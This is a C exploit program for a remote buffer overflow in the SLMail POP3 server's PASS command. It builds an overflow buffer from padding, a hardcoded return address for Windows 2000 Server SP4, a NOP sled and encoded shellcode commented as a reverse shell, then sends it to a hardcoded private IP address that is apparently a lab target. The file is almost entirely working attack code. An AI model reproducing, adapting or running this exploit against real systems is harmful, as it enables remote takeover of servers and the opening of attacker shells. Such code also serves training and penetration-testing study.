#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
#define retadd "\x8f\x35\x4a\x5f" /*win2k server sp4 0x773a459f*/
#define port 110

/* revshell العراق القراصنة المجموعة*/
char shellcode[] =
"\xba\x50\x84\xaf\xe1\xd9\xc4\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x31\x57\x12\x83\xc7\x04\x03\x07\x8a\x4d\x14\x5b\x7a\x13"
"\xd7\xa3\x7b\x74\x51\x46\x4a\xb4\x05\x03\xfd\x04\x4d\x41\xf2"
"\xef\x03\x71\x81\x82\x8b\x76\x22\x28\xea\xb9\xb3\x01\xce\xd8"
"\x37\x58\x03\x3a\x09\x93\x56\x3b\x4e\xce\x9b\x69\x07\x84\x0e"
"\x9d\x2c\xd0\x92\x16\x7e\xf4\x92\xcb\x37\xf7\xb3\x5a\x43\xae"
"\x13\x5d\x80\xda\x1d\x45\xc5\xe7\xd4\xfe\x3d\x93\xe6\xd6\x0f"
"\x5c\x44\x17\xa0\xaf\x94\x50\x07\x50\xe3\xa8\x7b\xed\xf4\x6f"
"\x01\x29\x70\x6b\xa1\xba\x22\x57\x53\x6e\xb4\x1c\x5f\xdb\xb2"
"\x7a\x7c\xda\x17\xf1\x78\x57\x96\xd5\x08\x23\xbd\xf1\x51\xf7"
"\xdc\xa0\x3f\x56\xe0\xb2\x9f\x07\x44\xb9\x32\x53\xf5\xe0\x5a"
"\x90\x34\x1a\x9b\xbe\x4f\x69\xa9\x61\xe4\xe5\x81\xea\x22\xf2"
"\xe6\xc0\x93\x6c\x19\xeb\xe3\xa5\xde\xbf\xb3\xdd\xf7\xbf\x5f"
"\x1d\xf7\x15\xcf\x4d\x57\xc6\xb0\x3d\x17\xb6\x58\x57\x98\xe9"
"\x79\x58\x72\x82\x10\xa3\x15\xa7\xef\xab\xda\xdf\xed\xab\x25"
"\x9b\x7b\x4d\x4f\xcb\x2d\xc6\xf8\x72\x74\x9c\x99\x7b\xa2\xd9"
"\x9a\xf0\x41\x1e\x54\xf1\x2c\x0c\x01\xf1\x7a\x6e\x84\x0e\x51"
"\x06\x4a\x9c\x3e\xd6\x05\xbd\xe8\x81\x42\x73\xe1\x47\x7f\x2a"
"\x5b\x75\x82\xaa\xa4\x3d\x59\x0f\x2a\xbc\x2c\x2b\x08\xae\xe8"
"\xb4\x14\x9a\xa4\xe2\xc2\x74\x03\x5d\xa5\x2e\xdd\x32\x6f\xa6"
"\x98\x78\xb0\xb0\xa4\x54\x46\x5c\x14\x01\x1f\x63\x99\xc5\x97"
"\x1c\xc7\x75\x57\xf7\x43\x95\xba\xdd\xb9\x3e\x63\xb4\x03\x23"
"\x94\x63\x47\x5a\x17\x81\x38\x99\x07\xe0\x3d\xe5\x8f\x19\x4c"
"\x76\x7a\x1d\xe3\x77\xaf";

 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2969);
    memset(buffer, 0x00, 2969);
    char *off = malloc(2606);
    memset(off, 0x00, 2607);
    memset(off, 0x41, 2606);
    char *nop = malloc(8);
    memset(nop, 0x00, 9);
    memset(nop, 0x90, 8);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.8.189");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
